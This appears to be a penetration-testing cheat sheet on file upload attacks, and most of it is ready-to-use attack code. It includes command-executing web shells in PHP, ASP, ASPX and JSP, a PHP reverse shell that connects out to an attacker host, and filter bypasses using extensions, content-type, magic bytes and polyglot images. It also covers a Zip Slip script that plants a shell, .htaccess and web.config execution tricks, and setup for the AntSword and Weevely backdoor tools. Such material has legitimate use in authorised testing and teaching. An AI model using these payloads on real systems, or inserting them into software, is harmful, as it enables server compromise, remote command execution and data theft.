# File Upload Attacks

## Table of Contents
- [Basic File Upload](#basic-file-upload)
- [Filter Bypass](#filter-bypass)
  - [Extension Bypass](#extension-bypass)
  - [Content-Type Bypass](#content-type-bypass)
  - [Magic Bytes Bypass](#magic-bytes-bypass)
- [Web Shells](#web-shells)
- [Image Shells](#image-shells)
- [Zip/Archive Attacks](#ziparchive-attacks)
- [WebShell Management Tools](#webshell-management-tools)
  - [AntSword](#antsword)
  - [Weevely](#weevely)
- [Other Techniques](#other-techniques)

---

## Basic File Upload

### Simple PHP Shell

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo `$_GET['cmd']`; ?>
```

### One-liner

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

### Usage

```
http://$rhost/uploads/shell.php?cmd=id
http://$rhost/uploads/shell.php?cmd=whoami
```

---

## Filter Bypass

### Extension Bypass

#### PHP Extensions

```
.php
.php3
.php4
.php5
.php7
.phtml
.pht
.phps
.phar
.phpt
.pgif
.phtm
.inc
```

#### ASP/ASPX Extensions

```
.asp
.aspx
.ashx
.asmx
.ascx
.config
.cshtml
.vbhtml
```

#### JSP Extensions

```
.jsp
.jspx
.jsw
.jsv
.jspf
```

#### Double Extensions

```
shell.php.jpg
shell.php.png
shell.php.gif
shell.jpg.php
shell.png.php
```

#### Null Byte (older systems)

```
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
```

#### Case Variation

```
shell.PhP
shell.PHP
shell.pHp
shell.Php
```

#### Special Characters

```
shell.php.
shell.php..
shell.php....
shell.php%20
shell.php%0a
shell.php%0d%0a
shell.php/
shell.php.\
```

#### Windows Tricks

```
shell.php::$DATA
shell.php:$DATA
```

### Content-Type Bypass

#### Valid Image Content-Types

```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/webp
```

#### Intercept and Modify

1. Upload file with valid extension (.jpg)
2. Intercept with Burp
3. Change Content-Type to `image/jpeg`
4. Change filename to `shell.php`
5. Keep PHP content

### Magic Bytes Bypass

#### Add Magic Bytes to Shell

```shell
# GIF
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# PNG
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php

# JPEG
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php
```

#### Common Magic Bytes

| Format | Magic Bytes | Hex |
| :--- | :--- | :--- |
| GIF | `GIF87a` or `GIF89a` | `47 49 46 38 37/39 61` |
| PNG | `‰PNG` | `89 50 4E 47 0D 0A 1A 0A` |
| JPEG | `ÿØÿà` | `FF D8 FF E0` |
| PDF | `%PDF` | `25 50 44 46` |
| ZIP | `PK` | `50 4B 03 04` |

---

## Web Shells

### PHP

```php
<?php system($_GET['cmd']); ?>

<?php 
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>

<?php echo shell_exec($_GET['cmd']); ?>

<?php passthru($_GET['cmd']); ?>

<?php exec($_GET['cmd'], $output); echo implode("\n", $output); ?>
```

### PHP Reverse Shell

```php
<?php
$ip = '$lhost';
$port = $lport;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### ASP

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objShell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<%= getCommandOutput(request("cmd")) %>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
```

### JSP

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
InputStream is = p.getInputStream();
BufferedReader br = new BufferedReader(new InputStreamReader(is));
String line;
while((line = br.readLine()) != null) {
    out.println(line);
}
%>
```

---

## Image Shells

### Inject PHP in Image Metadata

```shell
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

### Polyglot Files

```shell
# Create GIF polyglot
echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# Create PNG polyglot
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
```

### Using ImageMagick

```shell
convert xc:red -set comment '<?php system($_GET["cmd"]); ?>' shell.png
```

---

## Zip/Archive Attacks

### Zip Slip (Path Traversal)

```shell
# Create malicious zip
python3 zip_slip.py
```

```python
import zipfile

zf = zipfile.ZipFile('malicious.zip', 'w')
zf.writestr('../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
zf.close()
```

### Symlink Attack

```shell
# Create symlink to target file
ln -s /etc/passwd link
zip --symlinks evil.zip link
```

---

## WebShell Management Tools

### AntSword

> Cross-platform WebShell management tool with GUI

#### Installation

```shell
# Download AntSword Loader (Linux x64)
cd ~/Desktop
wget https://github.com/AntSwordProject/AntSword-Loader/releases/download/4.0.3/AntSword-Loader-v4.0.3-linux-x64.zip

# Extract
unzip AntSword-Loader-v4.0.3-linux-x64.zip

# Run
cd AntSword-linux-x64
./antsword
```

#### Supported Shells

PHP:
```php
<?php @eval($_POST['ant']); ?>
```

ASP:
```asp
<%eval request("ant")%>
```

ASPX:
```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["ant"],"unsafe");%>
```

JSP:
```jsp
<%Runtime.getRuntime().exec(request.getParameter("ant"));%>
```

#### Features
- File Manager
- Terminal
- Database Management
- Plugin Support

### Weevely

> Stealth PHP backdoor generator

```shell
# Generate backdoor
weevely generate password shell.php

# Connect to shell
weevely http://$rhost/uploads/shell.php password
```

---

## Other Techniques

### .htaccess Upload

```apache
# Make .php5 execute as PHP
AddType application/x-httpd-php .php5

# Make .jpg execute as PHP
AddHandler php-script .jpg
```

### Web.config (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

### PHP Filter Chain

```shell
# Generate payload
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

### Race Condition

1. Upload file
2. Quickly access before deletion
3. Use tools like Turbo Intruder

---

## Payload Cheat Sheet

| Technique | Payload |
| :--- | :--- |
| Double extension | `shell.php.jpg` |
| Null byte | `shell.php%00.jpg` |
| Magic bytes | `GIF89a<?php system($_GET["cmd"]); ?>` |
| Case bypass | `shell.PhP` |
| Content-Type bypass | Change to `image/jpeg` |
| .htaccess | `AddType application/x-httpd-php .jpg` |
